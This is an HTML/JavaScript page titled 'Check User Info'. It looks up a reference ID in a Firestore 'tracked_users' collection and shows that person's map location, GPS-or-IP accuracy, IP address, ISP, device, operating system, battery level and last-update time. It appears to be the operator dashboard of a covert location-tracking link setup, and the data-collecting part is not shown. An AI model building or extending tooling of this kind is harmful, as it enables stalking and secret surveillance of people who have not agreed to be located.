<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Check User Info</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; padding: 20px; }
        h1 { text-align: center; color: #333; margin-top: 50px; }
        .search-box { display: flex; justify-content: center; gap: 10px; max-width: 800px; margin: 0 auto 30px auto; }
        input { padding: 15px; border: 1px solid #ccc; border-radius: 5px; width: 40%; outline: none; }
        button { padding: 15px 30px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background-color: #0056b3; }
        #result-area { display: none; max-width: 800px; margin: 0 auto; background: white; border: 1px solid #ddd; border-radius: 5px; overflow: hidden; }
        .row { display: flex; border-bottom: 1px solid #eee; padding: 15px; }
        .label { font-weight: bold; width: 30%; color: #333; }
        .value { width: 70%; color: #555; word-break: break-all; }
        .map-link { color: #d32f2f; text-decoration: none; font-weight: bold; font-size: 1.1em; }
    </style>
</head>
<body>

    <h1>Check User Info</h1>

    <div class="search-box">
        <input type="text" id="refIdInput" placeholder="Enter Ref ID">
        <button onclick="fetchInfo()">Search</button>
    </div>

    <div id="result-area">
        <div class="row"><div class="label">Accuracy</div><div class="value" id="disp_acc" style="color: green; font-weight: bold;">...</div></div>
        <div class="row"><div class="label">Map</div><div class="value"><a href="#" id="disp_map" target="_blank" class="map-link">üìç Open Google Maps</a></div></div>
        <div class="row"><div class="label">IP Address</div><div class="value" id="disp_ip">...</div></div>
        <div class="row"><div class="label">ISP</div><div class="value" id="disp_isp">...</div></div>
        <div class="row"><div class="label">Device</div><div class="value" id="disp_device">...</div></div>
        <div class="row"><div class="label">Battery</div><div class="value" id="disp_battery">...</div></div>
        <div class="row"><div class="label">Last Updated</div><div class="value" id="disp_time">...</div></div>
    </div>

    <script type="module">
        import { db } from './firebase-config.js';
        import { doc, getDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";

        window.fetchInfo = async function() {
            const id = document.getElementById('refIdInput').value;
            const resultArea = document.getElementById('result-area');

            if(!id) { alert("Please enter a Ref ID"); return; }

            try {
                const docRef = doc(db, "tracked_users", id);
                const docSnap = await getDoc(docRef);

                if (docSnap.exists()) {
                    const data = docSnap.data();
                    
                    document.getElementById('disp_acc').innerText = data.accuracy || "Approx IP"; // Shows if GPS or IP
                    document.getElementById('disp_ip').innerText = data.ip;
                    document.getElementById('disp_isp').innerText = data.isp;
                    document.getElementById('disp_device').innerText = data.device + " (" + data.os + ")";
                    document.getElementById('disp_battery').innerText = data.battery;
                    document.getElementById('disp_time').innerText = data.lastUpdated;
                    
                    // Fixed Map Link logic
                    const mapUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
                    document.getElementById('disp_map').href = mapUrl;

                    resultArea.style.display = 'block';
                } else {
                    alert("No data found for this ID!");
                    resultArea.style.display = 'none';
                }
            } catch (error) {
                console.error("Error getting document:", error);
                alert("Error fetching data.");
            }
        }
    </script>
</body>
</html>
